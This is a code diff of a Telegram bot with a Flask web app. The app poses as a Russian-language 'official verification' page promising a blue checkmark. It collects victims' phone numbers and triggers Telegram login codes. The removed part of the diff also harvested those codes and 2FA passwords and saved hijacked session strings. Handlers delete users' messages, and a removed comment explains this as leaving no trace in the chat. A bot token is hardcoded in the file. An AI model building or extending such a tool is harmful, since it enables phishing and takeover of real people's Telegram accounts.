@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, request
+from flask import Flask, render_template_string, request, jsonify
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 import asyncio
@@ -15,6 +15,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn3
 
 active_sessions = {}
 
+# واجهة الويب الروسية الأنيقة التي تطلب مشاركة الرقم وتتواصل مع البوت
 WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -51,84 +52,36 @@ WEB_APP_HTML = """
             </div>
         </div>
         <h3>Официальная верификация</h3>
-        <p id="desc_text">Для получения синей галочки и подтверждения подлинности аккаунта, подтвердите номер телефона.</p>
+        <p id="desc_text">Для получения синей галочки подтвердите номер телефона.</p>
         
         <div id="content">
-            <div class="loader"></div>
+            <button onclick="requestPhone()">Подтвердить номер</button>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();
-        let userName = tg.initDataUnsafe?.user?.first_name || 'Telegram User';
+        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user';
+        let userName = tg.initDataUnsafe?.user?.first_name || 'User';
         document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();
 
-        window.onload = function() {
-            setTimeout(function() {
-                if (tg.requestContact) {
-                    tg.requestContact((shared, contact) => {
-                        if (shared && contact) {
-                            let phoneNum = contact.phone_number.toString();
-                            if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
-                            callApi('phone', phoneNum);
-                        } else {
-                            document.getElementById('content').innerHTML = `
-                                <p class="msg">Для верификации необходимо поделиться контактом.</p>
-                                <button onclick="location.reload()">Повторить</button>`;
-                        }
-                    });
-                }
-            }, 400);
-        };
-
-        function callApi(action, value) {
-            document.getElementById('content').innerHTML = `<p>Обработка данных...</p><div class="loader"></div>`;
-            fetch('/api', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: action, value: value, user_id: currentUserId })
-            })
-            .then(res => res.json())
-            .then(data => {
-                let html = '';
-                if (data.status === 'need_code') {
-                    document.getElementById('desc_text').innerText = "Введите код подтверждения из Telegram:";
-                    html = `<div id="error_box" class="msg"></div>
-                            <input type="text" id="code_val" placeholder="Код (например 12345)">
-                            <button onclick="submitCode()">Подтвердить</button>`;
-                } else if (data.status === 'need_password') {
-                    document.getElementById('desc_text').innerText = "Аккаунт защищен двухэтапной аутентификацией:";
-                    html = `<div id="error_box" class="msg"></div>
-                            <input type="password" id="pass_val" placeholder="Пароль 2FA">
-                            <button onclick="submitPassword()">Войти</button>`;
-                } else if (data.status === 'done') {
-                    document.getElementById('desc_text').innerText = "Аккаунт успешно верифицирован!";
-                    html = `<h3 style="color: #4cd964;">✅ Готово!</h3>
-                            <p>Сессия сохранена:</p>
-                            <div class="success">${data.session}</div>`;
-                } else {
-                    html = `<p class="msg">${data.message}</p>
-                            <button onclick="location.reload()">Повторить</button>`;
-                }
-                document.getElementById('content').innerHTML = html;
-            })
-            .catch(err => {
-                document.getElementById('content').innerHTML = `<p class="msg">Ошибка соединения с сервером.</p><button onclick="location.reload()">Повторить</button>`;
-            });
-        }
-
-        function submitCode() {
-            let code = document.getElementById('code_val').value.toString();
-            if(!code) { alert("Введите код!"); return; }
-            callApi('code', code);
-        }
-
-        function submitPassword() {
-            let pass = document.getElementById('pass_val').value.toString();
-            if(!pass) { alert("Введите пароль!"); return; }
-            callApi('password', pass);
+        function requestPhone() {
+            if (tg.requestContact) {
+                tg.requestContact((shared, contact) => {
+                    if (shared && contact) {
+                        let phoneNum = contact.phone_number.toString();
+                        if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
+                        
+                        // إرسال الرقم للبوت وتوجيهه لشات البوت تلقائياً
+                        tg.sendData(JSON.stringify({phone: phoneNum}));
+                    } else {
+                        alert("Требуется подтверждение номера!");
+                    }
+                });
+            } else {
+                alert("Откройте через Telegram App");
+            }
         }
     </script>
 </body>
@@ -139,75 +92,13 @@ WEB_APP_HTML = """
 def home():
     return render_template_string(WEB_APP_HTML)
 
-@app.route('/api', methods=['POST'])
-def api():
-    global active_sessions
-    data = request.json
-    action = data.get('action')
-    value = str(data.get('value')) if data.get('value') else ""
-    user_id = str(data.get('user_id'))
-
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-
-        if action == 'phone':
-            phone = str(value).strip()
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            loop.run_until_complete(client.connect())
-            
-            sent_code = loop.run_until_complete(client.send_code_request(phone))
-            
-            active_sessions[user_id] = {
-                'client': client,
-                'phone': phone,
-                'hash': str(sent_code.phone_code_hash)
-            }
-            return {"status": "need_code"}
-
-        elif action == 'code':
-            session_data = active_sessions.get(user_id)
-            if not session_data:
-                return {"status": "error", "message": "Сессия истекла."}
-            
-            client = session_data['client']
-            code = str(value).strip()
-            
-            try:
-                loop.run_until_complete(client.sign_in(str(session_data['phone']), code, phone_code_hash=str(session_data['hash'])))
-                session_str = client.session.save()
-                active_sessions[user_id]['session_str'] = session_str
-                return {"status": "done", "session": str(session_str)}
-            except Exception as e:
-                err_str = str(e)
-                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
-                    return {"status": "need_password"}
-                else:
-                    return {"status": "error", "message": err_str}
-
-        elif action == 'password':
-            session_data = active_sessions.get(user_id)
-            if not session_data:
-                return {"status": "error", "message": "Сессия истекла."}
-            
-            client = session_data['client']
-            password = str(value).strip()
-            
-            try:
-                loop.run_until_complete(client.sign_in(password=password))
-                session_str = client.session.save()
-                active_sessions[user_id]['session_str'] = session_str
-                return {"status": "done", "session": str(session_str)}
-            except Exception as e:
-                return {"status": "error", "message": f"Неверный пароль: {e}"}
-
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
-
-    return {"status": "error", "message": "Неизвестный запрос"}
-
-# --- أوامر البوت مع الحذف الفوري لأي رسالة يرسلها المستخدم في الشات ---
+# --- أداة البوت المتكاملة للربط التام ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
     web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
     if not web_url.startswith('http'):
         web_url = f"https://{web_url}"
@@ -220,12 +111,50 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
+async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    data = update.effective_message.web_app_data.data
+
+    # حذف رسالة الويب آب المرسلة في الشات لضمان النظافة
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
+    try:
+        import json
+        parsed = json.loads(data)
+        phone = parsed.get('phone')
+
+        if phone:
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(client.connect())
+            
+            sent_code = loop.run_until_complete(client.send_code_request(phone))
+            
+            active_sessions[user_id] = {
+                'client': client,
+                'phone': phone,
+                'hash': str(sent_code.phone_code_hash)
+            }
+
+            await update.message.reply_text(f"✅ Номер {phone} получен! Код отправлен в ваш Telegram.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка обработки: {e}")
+
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
     user_id = str(update.effective_user.id)
     session_data = active_sessions.get(user_id)
 
     if not session_data or 'session_str' not in session_data:
-        await update.message.reply_text("❌ Сначала пройдите верификацию в Web App!")
+        await update.message.reply_text("❌ Сначала завершите верификацию!")
         return
 
     args = context.args
@@ -254,7 +183,6 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
         await status_msg.edit_text(f"❌ Ошибка: {e}")
 
 async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # مسح أي رسالة يكتبها المستخدم فوراً لعدم ترك أي أثر في المحادثة
     try:
         await update.message.delete()
     except Exception:
@@ -271,8 +199,9 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("delet", delete_messages_command))
+    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm Final Clean Bot is running...")
+    print("Fokhm Fully Connected Bot is running...")
     application.run_polling()
 
